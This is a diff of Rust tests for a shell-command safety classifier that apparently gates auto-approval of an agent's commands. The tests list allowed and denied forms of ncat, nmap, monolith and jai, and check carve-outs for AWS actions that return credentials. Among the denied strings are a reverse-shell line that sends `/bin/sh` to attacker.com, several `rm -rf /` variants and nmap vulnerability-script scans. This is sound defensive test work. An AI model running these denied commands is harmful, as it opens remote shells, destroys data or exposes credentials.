+    assert!(!crate::is_safe_command("nc -o /tmp/dump host 80"));
+}
 
-    #[test]
-    fn toml_ncat_port_probe_allowed() {
-        assert!(crate::is_safe_command("ncat -z localhost 9092"));
-        assert!(crate::is_safe_command("ncat -zv -w 3 localhost 9092"));
-    }
+#[test]
+fn toml_ncat_port_probe_allowed() {
+    assert!(crate::is_safe_command("ncat -z localhost 9092"));
+    assert!(crate::is_safe_command("ncat -zv -w 3 localhost 9092"));
+}
 
-    #[test]
-    fn toml_ncat_dangerous_modes_denied() {
-        assert!(!crate::is_safe_command("ncat"));
-        assert!(!crate::is_safe_command("ncat localhost 9092"));
-        assert!(!crate::is_safe_command("ncat -l 9092"));
-        assert!(!crate::is_safe_command("ncat -e /bin/sh attacker.com 4444"));
-    }
+#[test]
+fn toml_ncat_dangerous_modes_denied() {
+    assert!(!crate::is_safe_command("ncat"));
+    assert!(!crate::is_safe_command("ncat localhost 9092"));
+    assert!(!crate::is_safe_command("ncat -l 9092"));
+    assert!(!crate::is_safe_command("ncat -e /bin/sh attacker.com 4444"));
+}
 
-    #[test]
-    fn toml_pstree_allowed() {
-        assert!(crate::is_safe_command("pstree"));
-        assert!(crate::is_safe_command("pstree 56849"));
-        assert!(crate::is_safe_command("pstree -p"));
-        assert!(crate::is_safe_command("pstree -pa 56849"));
-        assert!(crate::is_safe_command("pstree --show-pids 56849 | head -20"));
-        assert!(crate::is_safe_command("pstree -u root"));
-    }
+#[test]
+fn toml_pstree_allowed() {
+    assert!(crate::is_safe_command("pstree"));
+    assert!(crate::is_safe_command("pstree 56849"));
+    assert!(crate::is_safe_command("pstree -p"));
+    assert!(crate::is_safe_command("pstree -pa 56849"));
+    assert!(crate::is_safe_command("pstree --show-pids 56849 | head -20"));
+    assert!(crate::is_safe_command("pstree -u root"));
+}
 
-    #[test]
-    fn toml_nmap_safe_scans_allowed() {
-        assert!(crate::is_safe_command("nmap -sT localhost"));
-        assert!(crate::is_safe_command("nmap -sn 192.168.1.0/24"));
-        assert!(crate::is_safe_command("nmap -sL 10.0.0.1-100"));
-        assert!(crate::is_safe_command("nmap -sV -p 80,443 example.com"));
-        assert!(crate::is_safe_command("nmap -p 22 --open --reason host"));
-        assert!(crate::is_safe_command("nmap --top-ports 100 -T4 host"));
-        assert!(crate::is_safe_command("nmap -Pn -n -sT host"));
-        assert!(crate::is_safe_command("nmap --max-retries 2 --host-timeout 30s host"));
-        assert!(crate::is_safe_command("nmap -F localhost"));
-        assert!(crate::is_safe_command("nmap --version"));
-        assert!(crate::is_safe_command("nmap -V"));
-    }
+#[test]
+fn toml_nmap_safe_scans_allowed() {
+    assert!(crate::is_safe_command("nmap -sT localhost"));
+    assert!(crate::is_safe_command("nmap -sn 192.168.1.0/24"));
+    assert!(crate::is_safe_command("nmap -sL 10.0.0.1-100"));
+    assert!(crate::is_safe_command("nmap -sV -p 80,443 example.com"));
+    assert!(crate::is_safe_command("nmap -p 22 --open --reason host"));
+    assert!(crate::is_safe_command("nmap --top-ports 100 -T4 host"));
+    assert!(crate::is_safe_command("nmap -Pn -n -sT host"));
+    assert!(crate::is_safe_command("nmap --max-retries 2 --host-timeout 30s host"));
+    assert!(crate::is_safe_command("nmap -F localhost"));
+    assert!(crate::is_safe_command("nmap --version"));
+    assert!(crate::is_safe_command("nmap -V"));
+}
 
-    #[test]
-    fn toml_nmap_dangerous_modes_denied() {
-        assert!(!crate::is_safe_command("nmap"));
-        assert!(!crate::is_safe_command("nmap --script vuln host"));
-        assert!(!crate::is_safe_command("nmap --script=http-shellshock host"));
-        assert!(!crate::is_safe_command("nmap --script-args user=admin host"));
-        assert!(!crate::is_safe_command("nmap -A host"));
-        assert!(!crate::is_safe_command("nmap -O host"));
-        assert!(!crate::is_safe_command("nmap -sU host"));
-        assert!(!crate::is_safe_command("nmap -sS host"));
-        assert!(!crate::is_safe_command("nmap -sF host"));
-        assert!(!crate::is_safe_command("nmap -iL targets.txt"));
-        assert!(!crate::is_safe_command("nmap -oN out.txt host"));
-        assert!(!crate::is_safe_command("nmap -oA scan host"));
-        assert!(!crate::is_safe_command("nmap --data-string EVIL host"));
-        assert!(!crate::is_safe_command("nmap --scanflags SYNFIN host"));
-        assert!(!crate::is_safe_command("nmap --privileged host"));
-        assert!(!crate::is_safe_command("nmap --resume scan.gnmap"));
-        assert!(!crate::is_safe_command("nmap --script-updatedb"));
-    }
+#[test]
+fn toml_nmap_dangerous_modes_denied() {
+    assert!(!crate::is_safe_command("nmap"));
+    assert!(!crate::is_safe_command("nmap --script vuln host"));
+    assert!(!crate::is_safe_command("nmap --script=http-shellshock host"));
+    assert!(!crate::is_safe_command("nmap --script-args user=admin host"));
+    assert!(!crate::is_safe_command("nmap -A host"));
+    assert!(!crate::is_safe_command("nmap -O host"));
+    assert!(!crate::is_safe_command("nmap -sU host"));
+    assert!(!crate::is_safe_command("nmap -sS host"));
+    assert!(!crate::is_safe_command("nmap -sF host"));
+    assert!(!crate::is_safe_command("nmap -iL targets.txt"));
+    assert!(!crate::is_safe_command("nmap -oN out.txt host"));
+    assert!(!crate::is_safe_command("nmap -oA scan host"));
+    assert!(!crate::is_safe_command("nmap --data-string EVIL host"));
+    assert!(!crate::is_safe_command("nmap --scanflags SYNFIN host"));
+    assert!(!crate::is_safe_command("nmap --privileged host"));
+    assert!(!crate::is_safe_command("nmap --resume scan.gnmap"));
+    assert!(!crate::is_safe_command("nmap --script-updatedb"));
+}
 
-    #[test]
-    fn toml_monolith_allowed() {
-        assert!(crate::is_safe_command("monolith https://example.com"));
-        assert!(crate::is_safe_command("monolith -j -i https://example.com"));
-        assert!(crate::is_safe_command("monolith --no-audio --no-video https://example.com"));
-        assert!(crate::is_safe_command("monolith -C /tmp/cookies.txt https://example.com"));
-        assert!(crate::is_safe_command("monolith -u 'Mozilla/5.0' https://example.com"));
-        assert!(crate::is_safe_command("monolith --timeout 30 https://example.com"));
-        assert!(crate::is_safe_command("monolith https://example.com > /dev/null"));
-    }
+#[test]
+fn toml_monolith_allowed() {
+    assert!(crate::is_safe_command("monolith https://example.com"));
+    assert!(crate::is_safe_command("monolith -j -i https://example.com"));
+    assert!(crate::is_safe_command("monolith --no-audio --no-video https://example.com"));
+    assert!(crate::is_safe_command("monolith -C /tmp/cookies.txt https://example.com"));
+    assert!(crate::is_safe_command("monolith -u 'Mozilla/5.0' https://example.com"));
+    assert!(crate::is_safe_command("monolith --timeout 30 https://example.com"));
+    assert!(crate::is_safe_command("monolith https://example.com > /dev/null"));
+}
 
-    #[test]
-    fn toml_monolith_denied() {
-        assert!(!crate::is_safe_command("monolith"));
-        assert!(!crate::is_safe_command("monolith https://example.com -o /tmp/out.html"));
-        assert!(!crate::is_safe_command("monolith -o - https://example.com"));
-        assert!(!crate::is_safe_command("monolith --unknown https://example.com"));
-    }
+#[test]
+fn toml_monolith_denied() {
+    assert!(!crate::is_safe_command("monolith"));
+    assert!(!crate::is_safe_command("monolith https://example.com -o /tmp/out.html"));
+    assert!(!crate::is_safe_command("monolith -o - https://example.com"));
+    assert!(!crate::is_safe_command("monolith --unknown https://example.com"));
+}
 
-    #[test]
-    fn toml_jai_allowed() {
-        assert!(crate::is_safe_command("jai cat /tmp/foo"));
-        assert!(crate::is_safe_command("jai grep pattern /tmp/foo"));
-        assert!(crate::is_safe_command("jai --casual rg pattern src/"));
-        assert!(crate::is_safe_command("jai --strict sleep 1"));
-        assert!(crate::is_safe_command("jai claude plugin info foo"));
-    }
+#[test]
+fn toml_jai_allowed() {
+    assert!(crate::is_safe_command("jai cat /tmp/foo"));
+    assert!(crate::is_safe_command("jai grep pattern /tmp/foo"));
+    assert!(crate::is_safe_command("jai --casual rg pattern src/"));
+    assert!(crate::is_safe_command("jai --strict sleep 1"));
+    assert!(crate::is_safe_command("jai claude plugin info foo"));
+}
 
-    #[test]
-    fn toml_jai_denied() {
-        assert!(!crate::is_safe_command("jai rm -rf /"));
-        assert!(!crate::is_safe_command("jai"));
-        assert!(!crate::is_safe_command("jai bash"));
-        assert!(!crate::is_safe_command("jai --unknown-flag cat /tmp/x"));
-        assert!(!crate::is_safe_command("jai --casual bash -c 'rm -rf /'"));
-        assert!(!crate::is_safe_command("jai -- rm -rf /"));
-    }
+#[test]
+fn toml_jai_denied() {
+    assert!(!crate::is_safe_command("jai rm -rf /"));
+    assert!(!crate::is_safe_command("jai"));
+    assert!(!crate::is_safe_command("jai bash"));
+    assert!(!crate::is_safe_command("jai --unknown-flag cat /tmp/x"));
+    assert!(!crate::is_safe_command("jai --casual bash -c 'rm -rf /'"));
+    assert!(!crate::is_safe_command("jai -- rm -rf /"));
+}
 
-    #[test]
-    fn toml_claude_plugin_info_allowed() {
-        assert!(crate::is_safe_command("claude plugin info acme@acme-plugins"));
-        assert!(crate::is_safe_command("claude plugins info acme@acme-plugins"));
-    }
+#[test]
+fn toml_claude_plugin_info_allowed() {
+    assert!(crate::is_safe_command("claude plugin info acme@acme-plugins"));
+    assert!(crate::is_safe_command("claude plugins info acme@acme-plugins"));
+}
 
-    #[test]
-    fn toml_plutil_convert_allowed() {
-        assert!(crate::is_safe_command("plutil -convert xml1 -o - /tmp/foo.plist"));
-        assert!(crate::is_safe_command("plutil -convert binary1 -o - /tmp/foo.plist"));
-        assert!(crate::is_safe_command("plutil -convert json -r -o - /tmp/foo.plist"));
-        assert!(crate::is_safe_command("plutil -convert xml1 -o -"));
-    }
+#[test]
+fn toml_plutil_convert_allowed() {
+    assert!(crate::is_safe_command("plutil -convert xml1 -o - /tmp/foo.plist"));
+    assert!(crate::is_safe_command("plutil -convert binary1 -o - /tmp/foo.plist"));
+    assert!(crate::is_safe_command("plutil -convert json -r -o - /tmp/foo.plist"));
+    assert!(crate::is_safe_command("plutil -convert xml1 -o -"));
+}
 
-    #[test]
-    fn toml_plutil_convert_denied() {
-        assert!(!crate::is_safe_command("plutil -convert invalid -o - /tmp/in"));
-        assert!(!crate::is_safe_command("plutil -convert xml1 -e plist -o - /tmp/in"));
-    }
+#[test]
+fn toml_plutil_convert_denied() {
+    assert!(!crate::is_safe_command("plutil -convert invalid -o - /tmp/in"));
+    assert!(!crate::is_safe_command("plutil -convert xml1 -e plist -o - /tmp/in"));
+}
 
-    fn check_toml_unknown(prefix: &str, kind: &DispatchKind, failures: &mut Vec<String>) {
-        match kind {
-            DispatchKind::Branching { subs, .. } => {
-                for sub in subs {
-                    // A PROFILED sub is engine-classified by its archetype and ignores its flags on
-                    // the engine path (its legacy kind is deny-all) — so the blanket "unknown flag
-                    // fails closed" net does not apply. A flag that changes the classification
-                    // (a read→write flag) is declared explicitly via `[[command.sub.flag]]`
-                    // escalation, and caught by the adversarial review, not this net. Same principle
-                    // as the corpus gate's profiled-sub skip.
-                    if sub.profile.is_some() {
-                        continue;
-                    }
-                    check_toml_unknown(&format!("{prefix} {}", sub.name), &sub.kind, failures);
+fn check_toml_unknown(prefix: &str, kind: &DispatchKind, failures: &mut Vec<String>) {
+    match kind {
+        DispatchKind::Branching { subs, .. } => {
+            for sub in subs {
+                // A PROFILED sub is engine-classified by its archetype and ignores its flags on
+                // the engine path (its legacy kind is deny-all) — so the blanket "unknown flag
+                // fails closed" net does not apply. A flag that changes the classification
+                // (a read→write flag) is declared explicitly via `[[command.sub.flag]]`
+                // escalation, and caught by the adversarial review, not this net. Same principle
+                // as the corpus gate's profiled-sub skip.
+                if sub.profile.is_some() {
+                    continue;
                 }
+                check_toml_unknown(&format!("{prefix} {}", sub.name), &sub.kind, failures);
             }
-            DispatchKind::Policy { policy, .. } | DispatchKind::RequireAny { policy, .. }
-                if !policy.tolerance.unknown.allows_long() =>
-            {
-                let test = format!("{prefix} --xyzzy-unknown-42");
-                if crate::is_safe_command(&test) {
-                    failures.push(format!("{prefix}: accepted unknown flag"));
-                }
-            }
-            DispatchKind::WriteFlagged { policy, .. } if !policy.tolerance.unknown.allows_long() => {
-                let test = format!("{prefix} --xyzzy-unknown-42");
-                if crate::is_safe_command(&test) {
-                    failures.push(format!("{prefix}: accepted unknown flag"));
-                }
-            }
-            _ => {}
         }
+        DispatchKind::Policy { policy, .. } | DispatchKind::RequireAny { policy, .. } if !policy.tolerance.unknown.allows_long() => {
+            let test = format!("{prefix} --xyzzy-unknown-42");
+            if crate::is_safe_command(&test) {
+                failures.push(format!("{prefix}: accepted unknown flag"));
+            }
+        }
+        DispatchKind::WriteFlagged { policy, .. } if !policy.tolerance.unknown.allows_long() => {
+            let test = format!("{prefix} --xyzzy-unknown-42");
+            if crate::is_safe_command(&test) {
+                failures.push(format!("{prefix}: accepted unknown flag"));
+            }
+        }
+        _ => {}
     }
+}
 
+#[test]
+fn toml_specs_reject_unknown() {
+    let mut failures = Vec::new();
+    for (name, spec) in super::TOML_REGISTRY.iter() {
+        if name != &spec.name {
+            continue;
+        }
+        // See `toml_registry_rejects_unknown_flags`: grep owns its flag semantics.
+        if is_grep_hook(spec) {
+            continue;
+        }
+        check_toml_unknown(&spec.name, &spec.kind, &mut failures);
+    }
+    assert!(failures.is_empty(), "TOML specs accepted unknown flags:\n{}", failures.join("\n"));
+}
+
+fn collect_strict_paths() -> Vec<String> {
+    let mut paths = Vec::new();
+    for (name, spec) in super::TOML_REGISTRY.iter() {
+        if name != &spec.name {
+            continue;
+        }
+        // grep's hook treats an unrecognized `--token` as a search PATTERN (read-only), so it
+        // does not reject random flags — the same exemption the deny-unknown sweeps make.
+        if is_grep_hook(spec) {
+            continue;
+        }
+        collect_strict_inner(&spec.name, &spec.kind, &mut paths);
+    }
+    paths
+}
+
+fn collect_strict_inner(prefix: &str, kind: &DispatchKind, paths: &mut Vec<String>) {
+    match kind {
+        DispatchKind::Branching { subs, .. } => {
+            for sub in subs {
+                // A PROFILED sub is engine-classified by its archetype (auto-approves, its legacy
+                // kind is deny-all) — its strict flag policy is never the live contract, so the
+                // random-flag fuzz does not apply. A flag that changes the classification is
+                // declared via `[[command.sub.flag]]` / `output_path_flags` and caught by the
+                // adversarial review. Same exemption as `check_toml_unknown` above.
+                if sub.profile.is_some() {
+                    continue;
+                }
+                collect_strict_inner(&format!("{prefix} {}", sub.name), &sub.kind, paths);
+            }
+        }
+        DispatchKind::Policy { policy, .. } | DispatchKind::RequireAny { policy, .. } if !policy.tolerance.unknown.allows_long() => {
+            paths.push(prefix.to_string());
+        }
+        DispatchKind::WriteFlagged { policy, .. } if !policy.tolerance.unknown.allows_long() => {
+            paths.push(prefix.to_string());
+        }
+        _ => {}
+    }
+}
+
+proptest::proptest! {
     #[test]
-    fn toml_specs_reject_unknown() {
-        let mut failures = Vec::new();
-        for (name, spec) in super::TOML_REGISTRY.iter() {
-            if name != &spec.name { continue; }
-            // See `toml_registry_rejects_unknown_flags`: grep owns its flag semantics.
-            if is_grep_hook(spec) {
-                continue;
-            }
-            check_toml_unknown(&spec.name, &spec.kind, &mut failures);
-        }
-        assert!(failures.is_empty(), "TOML specs accepted unknown flags:\n{}", failures.join("\n"));
+    fn toml_strict_reject_random_flags(
+        seed in 0..1000usize,
+        suffix in "[a-z]{5,10}"
+    ) {
+        let paths = collect_strict_paths();
+        if paths.is_empty() { return Ok(()); }
+        let path = &paths[seed % paths.len()];
+        let test = format!("{path} --xyzzy-{suffix}");
+        proptest::prop_assert!(!crate::is_safe_command(&test),
+            "accepted random flag: {test}");
     }
+}
 
-    fn collect_strict_paths() -> Vec<String> {
-        let mut paths = Vec::new();
-        for (name, spec) in super::TOML_REGISTRY.iter() {
-            if name != &spec.name { continue; }
-            // grep's hook treats an unrecognized `--token` as a search PATTERN (read-only), so it
-            // does not reject random flags — the same exemption the deny-unknown sweeps make.
-            if is_grep_hook(spec) {
-                continue;
-            }
-            collect_strict_inner(&spec.name, &spec.kind, &mut paths);
+/// The invariant behind the AWS credential-glob carve-out batch (2026-07): a service that
+/// auto-approves read verbs via a `first_arg` glob but carves specific dangerous actions out to
+/// profiled sub-subs must (a) DENY every credential-/blob-profile carve-out, (b) still ALLOW the
+/// base form of a `remote-read` carve-out (the flag-conditional ones), and (c) keep AUTO-APPROVING
+/// a benign glob-sibling. Walks the real registry, so every AWS service with this shape — and any
+/// future one — is covered automatically, not a hand-picked list. Guards against a carve-out that
+/// silently fails to deny, and against a carve-out accidentally killing its service's glob.
+#[test]
+fn glob_carveouts_deny_while_the_glob_still_allows_siblings() {
+    use super::types::DispatchKind;
+    let Some(spec) = TOML_REGISTRY.get("aws") else { return };
+    let DispatchKind::Branching { subs: services, .. } = &spec.kind else {
+        panic!("aws is not Branching");
+    };
+    let mut deny_checks = 0;
+    let mut allow_checks = 0;
+    for svc in services {
+        let DispatchKind::Branching { subs: actions, first_arg, .. } = &svc.kind else { continue };
+        if first_arg.is_empty() || actions.is_empty() {
+            continue; // only the glob-plus-carve-out services
         }
-        paths
-    }
-
-    fn collect_strict_inner(prefix: &str, kind: &DispatchKind, paths: &mut Vec<String>) {
-        match kind {
-            DispatchKind::Branching { subs, .. } => {
-                for sub in subs {
-                    // A PROFILED sub is engine-classified by its archetype (auto-approves, its legacy
-                    // kind is deny-all) — its strict flag policy is never the live contract, so the
-                    // random-flag fuzz does not apply. A flag that changes the classification is
-                    // declared via `[[command.sub.flag]]` / `output_path_flags` and caught by the
-                    // adversarial review. Same exemption as `check_toml_unknown` above.
-                    if sub.profile.is_some() {
-                        continue;
-                    }
-                    collect_strict_inner(&format!("{prefix} {}", sub.name), &sub.kind, paths);
-                }
+        // (c) a benign action matching the glob is untouched by the carve-outs.
+        let prefix = first_arg[0].trim_end_matches('*');
+        let benign = format!("aws {} {prefix}zzz-benign-nonexistent", svc.name);
+        assert!(crate::is_safe_command(&benign), "carve-out killed the glob: `{benign}`");
+        allow_checks += 1;
+        for act in actions {
+            let Some(profile) = &act.profile else { continue };
+            let cmd = format!("aws {} {}", svc.name, act.name);
+            if profile.starts_with("credential-") || profile == "bulk-object-read" {
+                // (a) a deny-tier carve-out must not auto-approve, in any form.
+                assert!(!crate::is_safe_command(&cmd), "carve-out must deny: `{cmd}` (profile={profile})");
+                deny_checks += 1;
+            } else if profile == "remote-read" {
+                // (b) a flag-conditional carve-out's BASE read still auto-approves.
+                assert!(crate::is_safe_command(&cmd), "base read must allow: `{cmd}`");
+                allow_checks += 1;
             }
-            DispatchKind::Policy { policy, .. } | DispatchKind::RequireAny { policy, .. }
-                if !policy.tolerance.unknown.allows_long() =>
-            {
-                paths.push(prefix.to_string());
-            }
-            DispatchKind::WriteFlagged { policy, .. } if !policy.tolerance.unknown.allows_long() => {
-                paths.push(prefix.to_string());
-            }
-            _ => {}
-        }
-    }
-
-    proptest::proptest! {
-        #[test]
-        fn toml_strict_reject_random_flags(
-            seed in 0..1000usize,
-            suffix in "[a-z]{5,10}"
-        ) {
-            let paths = collect_strict_paths();
-            if paths.is_empty() { return Ok(()); }
-            let path = &paths[seed % paths.len()];
-            let test = format!("{path} --xyzzy-{suffix}");
-            proptest::prop_assert!(!crate::is_safe_command(&test),
-                "accepted random flag: {test}");
         }
     }
+    // Non-vacuity: the AWS batch is substantial — a regression that drops the carve-outs entirely
+    // would sink these counts.
+    assert!(deny_checks >= 70, "expected the AWS carve-out batch covered; deny_checks={deny_checks}");
+    assert!(allow_checks >= 40, "expected glob-siblings covered; allow_checks={allow_checks}");
+}
 
-    /// The invariant behind the AWS credential-glob carve-out batch (2026-07): a service that
-    /// auto-approves read verbs via a `first_arg` glob but carves specific dangerous actions out to
-    /// profiled sub-subs must (a) DENY every credential-/blob-profile carve-out, (b) still ALLOW the
-    /// base form of a `remote-read` carve-out (the flag-conditional ones), and (c) keep AUTO-APPROVING
-    /// a benign glob-sibling. Walks the real registry, so every AWS service with this shape — and any
-    /// future one — is covered automatically, not a hand-picked list. Guards against a carve-out that
-    /// silently fails to deny, and against a carve-out accidentally killing its service's glob.
-    #[test]
-    fn glob_carveouts_deny_while_the_glob_still_allows_siblings() {
-        use super::types::DispatchKind;
-        let Some(spec) = TOML_REGISTRY.get("aws") else { return };
-        let DispatchKind::Branching { subs: services, .. } = &spec.kind else {
-            panic!("aws is not Branching");
-        };
-        let mut deny_checks = 0;
-        let mut allow_checks = 0;
-        for svc in services {
-            let DispatchKind::Branching { subs: actions, first_arg, .. } = &svc.kind else { continue };
-            if first_arg.is_empty() || actions.is_empty() {
-                continue; // only the glob-plus-carve-out services
+/// Deterministic residue guard for the AWS credential-glob class (the user's "write a test to flush
+/// it out"). The fixture is every read-verb AWS action whose NAME smells of credentials/secrets/
+/// tokens, extracted from the bundled botocore models. Invariant: each must DENY (carved out) or
+/// appear in GRANDFATHER with a reason it is benign (returns only metadata / a public value / a
+/// policy — verified against the botocore output shape). A NEW credential-returning action that
+/// auto-approves is neither → the test fails and forces triage. This flushed `ssm get-access-token`
+/// and `lakeformation get-temporary-data-location-credentials` that the LLM sweep missed. GRANDFATHER
+/// shrinks only. Refresh the fixture whenever AWS is re-characterised.
+#[test]
+fn aws_credential_smell_actions_deny_or_are_grandfathered() {
+    // (service, action, why-benign) — each verified to return NO usable secret value.
+    const GRANDFATHER: &[(&str, &str, &str)] = &[
+        ("apigateway", "get-api-key", "flag-conditional: base is metadata; the key VALUE needs --include-value, gated separately"),
+        ("apigateway", "get-api-keys", "flag-conditional: base is metadata; values need --include-values, gated separately"),
+        ("chime-sdk-voice", "list-voice-connector-termination-credentials", "output is Usernames only; passwords are write-only"),
+        ("codebuild", "list-source-credentials", "SourceCredentialsInfo (arn/type/authType); no token value"),
+        ("codecatalyst", "list-access-tokens", "PAT metadata (id/name/expiry); token value shown only at creation"),
+        ("cognito-idp", "list-user-pool-client-secrets", "doc: 'the response never reveals the actual secret' — metadata only"),
+        ("cognito-idp", "list-web-authn-credentials", "WebAuthn public-key credentials (public keys / IDs), not secrets"),
+        ("iam", "get-account-password-policy", "the account password POLICY (length/complexity), not any password"),
+        ("iam", "get-login-profile", "console-login metadata (exists/create-date/reset), not the password"),
+        ("iam", "get-open-id-connect-provider", "OIDC provider config (url/client-ids/public thumbprints)"),
+        ("iam", "list-open-id-connect-provider-tags", "tags on an OIDC provider"),
+        ("iam", "list-open-id-connect-providers", "OIDC provider ARNs"),
+        ("iam", "list-service-specific-credentials", "credential metadata (id/username/status); password shown only at creation"),
+        ("ivs", "list-stream-keys", "stream-key ARN summaries; the value is in get-stream-key (denied)"),
+        ("kafka", "list-scram-secrets", "Secrets Manager ARNs associated to the cluster, not the values"),
+        ("secretsmanager", "describe-secret", "secret metadata (name/rotation/ARN), not the value"),
+        ("secretsmanager", "list-secret-version-ids", "version IDs/stages, not values"),
+        ("secretsmanager", "list-secrets", "secret metadata list, not values"),
+        ("sso-admin", "describe-instance-access-control-attribute-configuration", "ABAC attribute-mapping config, not credentials"),
+        ("wafv2", "get-decrypted-api-key", "output is TokenDomains + CreationTimestamp; no usable key value"),
+        ("wafv2", "list-api-keys", "CAPTCHA client-integration tokens, embedded in public JS by design"),
+        ("workmail", "get-personal-access-token-metadata", "PAT metadata (name/expiry), not the token"),
+        ("workmail", "list-personal-access-tokens", "PAT metadata list, not the tokens"),
+    ];
+    let fixture = include_str!("../../tests/fixtures/aws_credential_smell_actions.tsv");
+    let grand: std::collections::HashSet<(&str, &str)> = GRANDFATHER.iter().map(|(s, a, _)| (*s, *a)).collect();
+    let mut rows = 0;
+    let mut denied = 0;
+    let mut residue = Vec::new();
+    for line in fixture.lines().filter(|l| !l.trim().is_empty() && !l.starts_with('#')) {
+        let mut it = line.split('\t');
+        let (Some(svc), Some(act)) = (it.next(), it.next()) else { continue };
+        rows += 1;
+        if crate::is_safe_command(&format!("aws {svc} {act}")) {
+            if !grand.contains(&(svc, act)) {
+                residue.push(format!("aws {svc} {act}"));
             }
-            // (c) a benign action matching the glob is untouched by the carve-outs.
-            let prefix = first_arg[0].trim_end_matches('*');
-            let benign = format!("aws {} {prefix}zzz-benign-nonexistent", svc.name);
-            assert!(crate::is_safe_command(&benign), "carve-out killed the glob: `{benign}`");
-            allow_checks += 1;
-            for act in actions {
-                let Some(profile) = &act.profile else { continue };
-                let cmd = format!("aws {} {}", svc.name, act.name);
-                if profile.starts_with("credential-") || profile == "bulk-object-read" {
-                    // (a) a deny-tier carve-out must not auto-approve, in any form.
-                    assert!(!crate::is_safe_command(&cmd), "carve-out must deny: `{cmd}` (profile={profile})");
-                    deny_checks += 1;
-                } else if profile == "remote-read" {
-                    // (b) a flag-conditional carve-out's BASE read still auto-approves.
-                    assert!(crate::is_safe_command(&cmd), "base read must allow: `{cmd}`");
-                    allow_checks += 1;
-                }
-            }
+        } else {
+            denied += 1;
         }
-        // Non-vacuity: the AWS batch is substantial — a regression that drops the carve-outs entirely
-        // would sink these counts.
-        assert!(deny_checks >= 70, "expected the AWS carve-out batch covered; deny_checks={deny_checks}");
-        assert!(allow_checks >= 40, "expected glob-siblings covered; allow_checks={allow_checks}");
     }
-
-    /// Deterministic residue guard for the AWS credential-glob class (the user's "write a test to flush
-    /// it out"). The fixture is every read-verb AWS action whose NAME smells of credentials/secrets/
-    /// tokens, extracted from the bundled botocore models. Invariant: each must DENY (carved out) or
-    /// appear in GRANDFATHER with a reason it is benign (returns only metadata / a public value / a
-    /// policy — verified against the botocore output shape). A NEW credential-returning action that
-    /// auto-approves is neither → the test fails and forces triage. This flushed `ssm get-access-token`
-    /// and `lakeformation get-temporary-data-location-credentials` that the LLM sweep missed. GRANDFATHER
-    /// shrinks only. Refresh the fixture whenever AWS is re-characterised.
-    #[test]
-    fn aws_credential_smell_actions_deny_or_are_grandfathered() {
-        // (service, action, why-benign) — each verified to return NO usable secret value.
-        const GRANDFATHER: &[(&str, &str, &str)] = &[
-            ("apigateway", "get-api-key", "flag-conditional: base is metadata; the key VALUE needs --include-value, gated separately"),
-            ("apigateway", "get-api-keys", "flag-conditional: base is metadata; values need --include-values, gated separately"),
-            ("chime-sdk-voice", "list-voice-connector-termination-credentials", "output is Usernames only; passwords are write-only"),
-            ("codebuild", "list-source-credentials", "SourceCredentialsInfo (arn/type/authType); no token value"),
-            ("codecatalyst", "list-access-tokens", "PAT metadata (id/name/expiry); token value shown only at creation"),
-            ("cognito-idp", "list-user-pool-client-secrets", "doc: 'the response never reveals the actual secret' — metadata only"),
-            ("cognito-idp", "list-web-authn-credentials", "WebAuthn public-key credentials (public keys / IDs), not secrets"),
-            ("iam", "get-account-password-policy", "the account password POLICY (length/complexity), not any password"),
-            ("iam", "get-login-profile", "console-login metadata (exists/create-date/reset), not the password"),
-            ("iam", "get-open-id-connect-provider", "OIDC provider config (url/client-ids/public thumbprints)"),
-            ("iam", "list-open-id-connect-provider-tags", "tags on an OIDC provider"),
-            ("iam", "list-open-id-connect-providers", "OIDC provider ARNs"),
-            ("iam", "list-service-specific-credentials", "credential metadata (id/username/status); password shown only at creation"),
-            ("ivs", "list-stream-keys", "stream-key ARN summaries; the value is in get-stream-key (denied)"),
-            ("kafka", "list-scram-secrets", "Secrets Manager ARNs associated to the cluster, not the values"),
-            ("secretsmanager", "describe-secret", "secret metadata (name/rotation/ARN), not the value"),
-            ("secretsmanager", "list-secret-version-ids", "version IDs/stages, not values"),
-            ("secretsmanager", "list-secrets", "secret metadata list, not values"),
-            ("sso-admin", "describe-instance-access-control-attribute-configuration", "ABAC attribute-mapping config, not credentials"),
-            ("wafv2", "get-decrypted-api-key", "output is TokenDomains + CreationTimestamp; no usable key value"),
-            ("wafv2", "list-api-keys", "CAPTCHA client-integration tokens, embedded in public JS by design"),
-            ("workmail", "get-personal-access-token-metadata", "PAT metadata (name/expiry), not the token"),
-            ("workmail", "list-personal-access-tokens", "PAT metadata list, not the tokens"),
-        ];
-        let fixture = include_str!("../../tests/fixtures/aws_credential_smell_actions.tsv");
-        let grand: std::collections::HashSet<(&str, &str)> =
-            GRANDFATHER.iter().map(|(s, a, _)| (*s, *a)).collect();
-        let mut rows = 0;
-        let mut denied = 0;
-        let mut residue = Vec::new();
-        for line in fixture.lines().filter(|l| !l.trim().is_empty() && !l.starts_with('#')) {
-            let mut it = line.split('\t');
-            let (Some(svc), Some(act)) = (it.next(), it.next()) else { continue };
-            rows += 1;
-            if crate::is_safe_command(&format!("aws {svc} {act}")) {
-                if !grand.contains(&(svc, act)) {
-                    residue.push(format!("aws {svc} {act}"));
-                }
-            } else {
-                denied += 1;
-            }
-        }
-        assert!(
-            residue.is_empty(),
-            "credential-smell AWS actions auto-approve with no grandfather entry — carve them out, or \
+    assert!(
+        residue.is_empty(),
+        "credential-smell AWS actions auto-approve with no grandfather entry — carve them out, or \
              GRANDFATHER with a verified reason (checked its botocore output shape):\n  {}",
-            residue.join("\n  "),
-        );
-        assert!(rows >= 50, "fixture shrank unexpectedly: {rows} rows");
-        assert!(denied >= 25, "too few denies — carve-outs may have regressed: {denied}");
-        for (s, a, _) in GRANDFATHER {
-            assert!(
-                fixture.lines().any(|l| l == format!("{s}\t{a}")),
-                "stale GRANDFATHER entry not in fixture: {s} {a}",
-            );
+        residue.join("\n  "),
+    );
+    assert!(rows >= 50, "fixture shrank unexpectedly: {rows} rows");
+    assert!(denied >= 25, "too few denies — carve-outs may have regressed: {denied}");
+    for (s, a, _) in GRANDFATHER {
+        assert!(fixture.lines().any(|l| l == format!("{s}\t{a}")), "stale GRANDFATHER entry not in fixture: {s} {a}",);
+    }
+}
+
+/// UNIVERSAL structural guard for verb-glob CLIs (#5). A `first_arg` glob matches the FIRST token
+/// and IGNORES the rest — correct for a VERB glob (`get-*`, `describe`), catastrophic for a glob
+/// listing SUBGROUP names: `gcloud redis ["instances","operations"]` auto-approves EVERY verb under
+/// `instances` (create, delete, irreversible-destroy, `get-auth-string`), because dispatch stops at
+/// the first token. The primitive is sharp on purpose; this guard de-fangs its MISUSE across the
+/// whole registry. Each hierarchical `<binary> <group> <subgroup…> <verb>` CLI registers its vetted
